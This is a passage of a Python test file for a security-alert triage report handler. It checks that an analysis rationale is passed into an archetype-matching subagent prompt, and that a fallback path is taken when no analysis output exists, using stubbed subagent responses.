        assert len(archetype_match_prompts) == 1, (
            "archetype-match must fire exactly once on the ANALYZE-routed path"
        )
        # The archetype-match stub's answer drives the report, not ANALYZE's.
        assert result.payload["matched_archetype"] == "monitoring-probe"
        # Prompt carries the confirmed evidence inputs (not just the alert).
        prompt = archetype_match_prompts[0]
        assert "disposition=benign" in prompt
        assert "confidence=high" in prompt
        assert "mechanism_summary=" in prompt
        assert "trust_anchors_confirmed:" in prompt

    def test_mechanism_summary_uses_analyze_rationale_when_present(
        self, tmp_path, monkeypatch,
    ):
        """ANALYZE's optional `rationale` field (one-line mechanism summary
        from the terminal YAML) flows into archetype-match's
        `mechanism_summary` input. Without it, the summary falls back to
        `surviving: <ids>` which is anemic."""
        ctx = _seed_ctx_for_analyze_mechanical(
            tmp_path,
            analyze_payload={
                "disposition": "benign",
                "confidence": "high",
                "rationale": "cadenced monitoring probe; anchor authorized",
                "surviving_hypotheses": ["h-001"],
            },
            investigation_md=_INV_RESOLVED_ANCHOR,
        )
        archetype_match_prompts: list[str] = []

        def fake_archetype(prompt, *, timeout=None, session_id=None):
            archetype_match_prompts.append(prompt)
            return (
                "```yaml\nmatched_archetype: monitoring-probe\n"
                "justification: stub\n```"
            )

        def fake_narrative(agent, prompt, *, model=None, timeout=None):
            if agent == "report_narrative":
                return "<summary>\nResolved.\n</summary>"
            raise AssertionError(f"unexpected subagent: {agent}")

        monkeypatch.setattr(report_handler, "_invoke_archetype_match", fake_archetype)
        monkeypatch.setattr(report_handler, "_shared_invoke", fake_narrative)
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke([], "UNEXPECTED"),
        )

        report_handler.handle(ctx)
        prompt = archetype_match_prompts[0]
        assert (
            "mechanism_summary=cadenced monitoring probe; anchor authorized"
            in prompt
        ), f"rationale not threaded into archetype-match prompt: {prompt}"
        # The fallback shape must not appear when rationale is present.
        assert "mechanism_summary=surviving: h-001" not in prompt

    def test_no_analyze_payload_skips_mechanical_path(
        self, tmp_path, monkeypatch,
    ):
        """Missing ANALYZE output → no mechanical attempt, fall through."""
        ctx = make_ctx(tmp_path, ticket_id="SEC-2026-042")
        # No ANALYZE or SCREEN output. Handler routes to forced_exhaustion.
        response = textwrap.dedent("""
        ```yaml
        status: written
        report_path: /tmp/report.md
        disposition: unclear
        confidence: low
        matched_archetype: null
        status_frontmatter: escalated
        ```
        """).strip()
        captured: list[str] = []
        monkeypatch.setattr(
            report_handler, "_invoke_subagent", stub_invoke(captured, response),
        )
        report_handler.handle(ctx)
        assert len(captured) == 1
        # mechanical_fallback_reason should NOT be set — we never attempted
        # a mechanical compose.
        # (The test covers the "no preconditions met" branch.)
